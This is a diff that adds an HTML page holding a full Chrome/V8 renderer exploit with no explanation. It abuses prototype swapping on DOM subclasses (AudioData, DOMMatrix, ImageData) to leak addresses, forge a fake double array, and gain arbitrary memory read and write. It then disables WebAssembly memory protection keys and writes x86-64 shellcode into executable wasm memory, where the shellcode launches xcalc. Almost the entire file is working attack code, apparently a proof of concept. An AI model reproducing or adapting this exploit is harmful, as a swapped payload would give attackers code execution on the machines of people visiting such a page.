@@ -1,0 +1,232 @@
+<html>
+  <script>
+
+    var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
+    var shellCode = [0x31, 0xf6, 0x31, 0xd2, 0x31, 0xc0, 0xbb, 0x6c, 0x63, 0x00, 0x00, 0x53, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x53, 0x54, 0x5f, 0x56, 0x57, 0x54, 0x5e, 0xbb, 0x3a, 0x30, 0x2e, 0x30, 0x53, 0x48, 0xbb, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x53, 0x54, 0x41, 0x5a, 0x52, 0x41, 0x52, 0x54, 0x5a, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0xf, 0x5];
+
+    var wasmMemoryProtectionKeysOffset = 0x34a086n;
+
+    var loopCount = 0x10;
+    var view = new ArrayBuffer(24);
+    var dblArr = new Float64Array(view);
+    var intView = new Int32Array(view);
+    var bigIntView = new BigInt64Array(view);
+    var flArr = new Float32Array(view);
+
+    var decoderBufferOffset = 0x8;
+
+    function f32toi(f) {
+      flArr[0] = f;
+      return intView[0];
+    }
+
+    function ftoi32(f) {
+      dblArr[0] = f;
+      return [intView[0], intView[1]];
+    }
+
+    function i32tof(i1, i2) {
+      intView[0] = i1;
+      intView[1] = i2;
+      return dblArr[0];
+    }
+
+    function itof(i) {
+      bigIntView[0] = i;
+      return dblArr[0];
+    }
+
+    function ftoi(f) {
+      dblArr[0] = f;
+      return bigIntView[0];
+    }
+
+    function i32toi(i_lo, i_hi) {
+      intView[0] = i_lo;
+      intView[1] = i_hi;
+      return bigIntView[0];
+    }
+
+    class SubAudioData extends AudioData {
+      constructor(addr) {
+        let input = audioDataInput;
+        input.timestamp = addr;
+        super(input);
+      }
+        
+      getFakeObj() {
+        return super.signal;
+      }
+    }
+
+    class SubMatrix extends DOMMatrix {
+      constructor(addr) {
+        let input = matrixInput;
+        input[10] = itof(BigInt(addr - 0x18));
+        super(input);
+      }
+
+      readContent() {
+        return super.interval;
+      }
+    }
+
+    var height = 4;
+    var width = 3;
+
+    class SubImg extends ImageData {
+      constructor(imgData) {
+        super(imgData, height,width);
+      }
+        
+      getAddr() {
+        return super.m21;
+      }
+    }
+
+    var audioBufferInput = {length: 30000, sampleRate: 4000};
+    var audioDataInput = {format: "u8", sampleRate: 4000, numberOfFrames: 100, numberOfChannels: 1, timestamp: 0, data : new Int8Array(100)};
+    //matrix memory layout: m12 = matrix_[0][1], m21 = matrix_[1][0] ... double arrays
+    var matrixInput = [11,12,13,14,21,22,23,24,31,32,33,34,41,42,43,44];
+
+    var domMatrixImg = new DOMMatrix(matrixInput);
+
+    var audioData = new AudioData(audioDataInput);
+
+    var req = new Request({});
+
+    var motionEvent = new DeviceMotionEvent({});
+
+    function leakImageAddr(i) {
+      domMatrixImg['a' + i] = 1;
+      if (i < loopCount) {
+        SubImg.prototype.__proto__ = {};
+      } else {
+        SubImg.prototype.__proto__ = domMatrixImg;
+      }
+      domMatrixImg.m21;
+      let addr = img.getAddr();
+      return Number(ftoi(addr));
+    }
+
+    function readFrom(i, subMatrix) {
+      motionEvent['a' + i] = 1;
+      if (i < loopCount) {
+        SubMatrix.prototype.__proto__ = {};
+      } else {
+        SubMatrix.prototype.__proto__ = motionEvent;
+      }
+      motionEvent.interval;
+      let addr = subMatrix.readContent();
+      return addr;
+    }
+
+    function createFakeObj(i, addr) {
+      req['a' + i] = 1;
+      if (i < loopCount) {
+        SubAudioData.prototype.__proto__ = {};
+      } else {
+        SubAudioData.prototype.__proto__ = req;
+      }
+      req.signal;
+      return subAudio.getFakeObj();
+    }
+
+    function addrOf(obj) {
+      objArr[0] = obj;
+      return ftoi32(fakeDblArr[5])[0];
+    }
+
+    function compressedRead(addr) {
+      doubleArr[1] = i32tof(addr - 0x8, 0x1000);
+      let out = fakeDblArr[0];
+      doubleArr[1] = doubleArrDefault;
+      return out;
+    }
+
+    function compressedWrite(addr, value) {
+      doubleArr[1] = i32tof(addr - 0x8, 0x1000);
+      fakeDblArr[0] = value;
+      doubleArr[1] = doubleArrDefault;
+    }
+
+    var imgDataStore = new ArrayBuffer(48);
+    var imgData = new Uint8ClampedArray(imgDataStore);
+    var doubleArr = [1.1, 2.2, 3.3, 4.4, 5.5];
+    var objArr = [imgData];
+
+    var img = new SubImg(imgData);
+
+    for (let i = 0; i < loopCount; i++) {
+      leakImageAddr(i);
+    }
+
+    let imgAddr = leakImageAddr(loopCount);
+
+    let mainWorldMatrix = new SubMatrix(imgAddr + 0x8);
+
+    for (let i = 0; i < loopCount; i++) {
+      readFrom(i, mainWorldMatrix);
+    }
+
+    let mainWorldWrapper = Number(ftoi(readFrom(loopCount, mainWorldMatrix)));
+
+    let wrapperMatrix = new SubMatrix(imgAddr);
+
+    let wrapperAddr = ftoi(readFrom(loopCount, wrapperMatrix));
+
+    let v8AddrMatrix = new SubMatrix(mainWorldWrapper);
+
+    let v8TypedArrayAddr = Number(ftoi(readFrom(loopCount, v8AddrMatrix)));
+
+    let doubleArrMatrix = new SubMatrix(v8TypedArrayAddr + 0x74 - 1);
+    let doubleMap = ftoi32(readFrom(loopCount, doubleArrMatrix))[1];
+
+    let fakeWrapper64View = new BigInt64Array(imgDataStore);
+    fakeWrapper64View[0] = BigInt(v8TypedArrayAddr + 0x50);
+
+    var doubleArrElementDefault = (v8TypedArrayAddr + 0x60) >> 0;
+    var doubleArrDefault = i32tof(doubleArrElementDefault, 0x1000);
+
+    //map + properties
+    doubleArr[0] = i32tof(doubleMap, 0x8002249);
+    //elements + length
+    doubleArr[1] = doubleArrDefault;
+    doubleArr[2] = i32tof(0x8002249, 0x1000);
+    doubleArr[3] = 1.1;
+
+    //Add 0x8 to skip vtable, so that the fake main_world_wrapper_ points to the address of the datastore
+    var subAudio = new SubAudioData(imgAddr + 0x8);
+
+    for (let i = 0; i < loopCount; i++) {
+      createFakeObj(i);
+    }
+    var fakeDblArr = createFakeObj(loopCount);
+
+    var shellArray = new Uint8Array(100);
+    shellArray.fill(0x41);
+
+    var wasmProtectionKeyAddr = wrapperAddr + wasmMemoryProtectionKeysOffset;
+    var shellArrayAddr = addrOf(shellArray);
+
+    compressedWrite(shellArrayAddr + 0x2c, itof(wasmProtectionKeyAddr));
+    for (let i = 0; i < 8; i++) {
+      shellArray[i] = 0;
+    }
+
+    var module = new WebAssembly.Module(code);
+    var instance = new WebAssembly.Instance(module);
+    var wasmMain = instance.exports.main;
+
+    var instanceAddr = addrOf(instance);
+    var wasmRWX = compressedRead(instanceAddr + 0x60);
+
+    compressedWrite(shellArrayAddr + 0x2c, wasmRWX);
+    for (let i = 0; i < shellCode.length; i++) {
+      shellArray[i] = shellCode[i];
+    }
+    wasmMain();
+  </script>
+  <body>
+  </body>
+</html>
